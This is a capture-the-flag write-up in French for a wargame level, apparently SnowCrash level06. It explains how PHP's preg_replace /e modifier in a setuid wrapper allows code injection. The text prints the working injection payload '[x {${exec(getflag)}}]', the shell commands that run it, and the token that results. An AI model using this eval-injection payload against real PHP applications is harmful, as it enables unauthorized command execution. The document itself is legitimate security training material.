Je streamline ma procédure d'identification : 

```
$ id && pwd && ls -la
uid=2006(level06) gid=2006(level06) groups=2006(level06),100(users)
/home/user/level06
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

J'observe d'entrée de jeu un binaire `level06` et un fichier .php du même nom.

Je `cat` le fichier .php et j'exécute le binaire :

```
$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

Je me penche sur le fichier .php et le commente ci-dessous :

```php
#!/usr/bin/php
<?php

// Takes an $m argument
function y($m) {
	// Replaces '.' with ' x ' in $m
	$m = preg_replace("/\./", " x ", $m); 
	// Replaces '@' with ' y' in $m
	$m = preg_replace("/@/", " y", $m); 
	
	return $m; 
}

// Takes two arguments $z and $y
function x($y, $z) {
	// Read the files content at the $y path and store it in $a
	$a = file_get_contents($y); 
	
	// The first argument is a Regex pattern to match from
	// with the "e" modifier, which evaluates the substitution (second arg) as PHP code.
	// The second argument is the function executed whose result
	// will be used to pattern match and replace.
	// So 'replace' 'what matches the regex' by 'result of y(2)' in '$a'
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

	// Replaces all squares brackets with parentheses
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	
	return $a; 
}

// Prints $r, which is the return value of the function x with the args passed to the file.
$r = x($argv[1], $argv[2]); print $r;

?>
```

D'après cette discussion : [Can someone explain the /e regex modifier?](https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier) le modifier "/e" lors d'un matching de pattern regex avec la fonction `preg_replace` signifie que l'argument de substitution est évalué en PHP. Cette option est `deprecated` pour cette raison et présente une vulnérabilité.

Ici, cela signifie que ce qui match avec le premier argument:
- `(\[x (.*)\])` <- regex pattern

sera remplacé par l'exécution en PHP du second argument:
- `y(\"\\2\")` <- ici `\2` signifie que ce sera le deuxième match de la regex qui sera passé en argument à `y()`, le deuxième match étant la paire de parenthèses intérieure)

dans la string
- `$a`

---

Avec cette information, j'en déduit la vulnérabilité suivante :

1. Le programme commence par écouter les arguments en entrée, les passes à la fonction x, et print le résultat : `$r = x($argv[1], $argv[2]); print $r;`
2. Cela signifie que l'argument 1 représente `$y` dans `x()` , et le second `$z` dans `x()`.
3. Cela signifie que le `$y` doit représenter un fichier qui va être lu et stocké dans `$a` à l'intérieur de `x()`
4. Le second argument est inutilisé, je ne m'en soucie donc pas.

Puisque l'argument `$y` va être lu, et stocké dans `$a`, sur lequel sera appliqué la regex. 

- La regex en question:
`(\[x (.*)\])` signifie que l'ensemble du matching est capturé (`()` extérieures), dans ce match, on cherche `[` (précédé d'un `\` car `[` et `]` peuvent signifier autre chose en Regex), puis un `x`, puis un espace, et enfin on capture à nouveau (le fameux `\2` vu plus haut) la séquence : `.*` qui signifie : `any character except newline` pour le `.` et le `*` signifie `0 or more time`. Enfin, on match un `]` et fermons le premier groupe de capture. 

Supposons le fichier suivant :

```
# flag
[x pomme]
```

S'il était passé à la fonction `x()` elle capturerait dans `\1` : `[x pomme]` et dans `\2` : `pomme`.

Si je créé et passe ce fichier :

```
$ echo "[x pomme]" > /tmp/flag
$ ./level06 /tmp/flag
pomme
```

La ligne PHP :

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

Signifie que le premier argument matche `[x pomme]` et demande de remplacer le match par le résultat de `y(valeur_de_\2)`, donc par `pomme`.

Comme vu plus haut, le modifier `/e` évalue le code comme du PHP lors de la substitution, de plus, j'observe qu'au tout début, le binaire est exécuté par l'utilisateur `flag06`.

Si j'arrive donc à exécuter `getflag` depuis le PHP, j'aurais le retour de la commande depuis `flag06`.

Je remplace donc `pomme` dans mon fichier par :

```
[x {${exec(getflag)}}]
```

Puisque  l'argument que l'on passe à `y()` lors de la substitution est du PHP à évaluer à cause du modifier vulnérable, alors, en matchant `{${exec(getflag)}}` comme sous-groupe, PHP va tenter d'évaluer ce bout de code pour pouvoir le passer comme argument à `y()`.

Il tente cette évaluation due au `{}` parents. Appelé en PHP "Complex Curly Syntax". Une fois à l'intérieur, il évalue la valeur de la "fonction" `${...}`, cette dernière contenant `exec`, qui exécute un programme externe.

Si nous ne mettions pas les `{}` parents, alors `y()` recevrait `${exec(getflag)}` et PHP ne peut pas l'évaluer :

```
$ echo '[x ${exec(getflag)}]' > /tmp/flag && ./level06 /tmp/flag

PHP Parse error:  syntax error, unexpected '(' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code:
y("${exec(getflag)}") in /home/user/level06/level06.php on line 4
```

Avec les `{}` parents :

```
$ echo '[x {${exec(getflag)}}]' > /tmp/flag && ./level06 /tmp/flag

PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

Le code échoue la suite de son exécution, mais la substitution ayant bien été évaluée, elle est imprimée dans le message d'erreur et me confère donc la solution !








